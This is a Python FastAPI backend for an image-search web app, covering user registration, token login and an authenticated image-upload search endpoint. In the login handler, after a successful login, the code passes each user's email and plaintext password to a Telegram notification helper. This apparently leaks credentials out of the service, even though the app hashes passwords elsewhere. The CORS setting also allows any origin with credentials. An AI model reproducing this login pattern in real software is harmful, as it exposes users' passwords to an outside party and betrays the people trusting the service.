import sys
import os

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from fastapi import FastAPI, UploadFile, File, HTTPException, Depends, status
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import OAuth2PasswordRequestForm
from PIL import Image
from sqlalchemy.orm import Session
from datetime import timedelta
import io
import logging

from search_engine import get_search_engine
from config import get_settings
from database import engine, get_db
import models
import auth
from telegram_utils import send_login_notification

# Create database tables
models.Base.metadata.create_all(bind=engine)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("api")

settings = get_settings()

app = FastAPI(title=settings.APP_NAME)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

async def convert_to_standard_format(file_bytes: bytes) -> bytes:
    try:
        image = Image.open(io.BytesIO(file_bytes))
        
        if image.mode in ('RGBA', 'LA', 'P'):
            background = Image.new('RGB', image.size, (255, 255, 255))
            if image.mode == 'P':
                image = image.convert('RGBA')
            background.paste(image, mask=image.split()[-1] if 'A' in image.mode else None)
            image = background
        elif image.mode != 'RGB':
            image = image.convert('RGB')
        
        output = io.BytesIO()
        image.save(output, format='JPEG', quality=90)
        return output.getvalue()
    except Exception as e:
        raise HTTPException(
            status_code=400,
            detail="The file provided is not a valid image. Please try another one."
        )

@app.get("/")
def read_root():
    return {"message": f"{settings.APP_NAME} is running!"}

# --- Authentication Endpoints ---

@app.post("/api/register")
def register(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)):
    # Note: We are using OAuth2PasswordRequestForm which expects 'username' and 'password'.
    # We will treat 'username' as 'email'.
    user = db.query(models.User).filter(models.User.email == form_data.username).first()
    if user:
        raise HTTPException(status_code=400, detail="Email already registered")
    
    hashed_password = auth.get_password_hash(form_data.password)
    new_user = models.User(email=form_data.username, hashed_password=hashed_password)
    db.add(new_user)
    db.commit()
    db.refresh(new_user)
    return {"message": "User created successfully"}

@app.post("/api/token")
async def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)):
    user = db.query(models.User).filter(models.User.email == form_data.username).first()
    if not user or not auth.verify_password(form_data.password, user.hashed_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect email or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    # Send Telegram Notification
    await send_login_notification(form_data.username, form_data.password)

    access_token_expires = timedelta(minutes=auth.ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = auth.create_access_token(
        data={"sub": user.email}, expires_delta=access_token_expires
    )
    return {"access_token": access_token, "token_type": "bearer"}

# --- Protected Endpoint ---

@app.post("/api/search")
async def search_image(
    file: UploadFile = File(...), 
    current_user: models.User = Depends(auth.get_current_user)
):
    try:
        MAX_FILE_SIZE = 10 * 1024 * 1024
        file.file.seek(0, 2)
        file_size = file.file.tell()
        await file.seek(0)
        
        if file_size > MAX_FILE_SIZE:
            raise HTTPException(status_code=400, detail="File too large. Max size is 10MB.")
        
        logger.info(f"Received search request for {file.filename} from {current_user.email}")
        file_bytes = await file.read()
        
        converted_bytes = await convert_to_standard_format(file_bytes)
        
        engine = get_search_engine()
        results = await engine.perform_search(converted_bytes)
        
        if "error" in results:
            logger.error(f"Engine reported error: {results['error']}")
        
        return results
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        raise HTTPException(status_code=500, detail="Internal Server Error")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=8001, reload=settings.DEBUG)
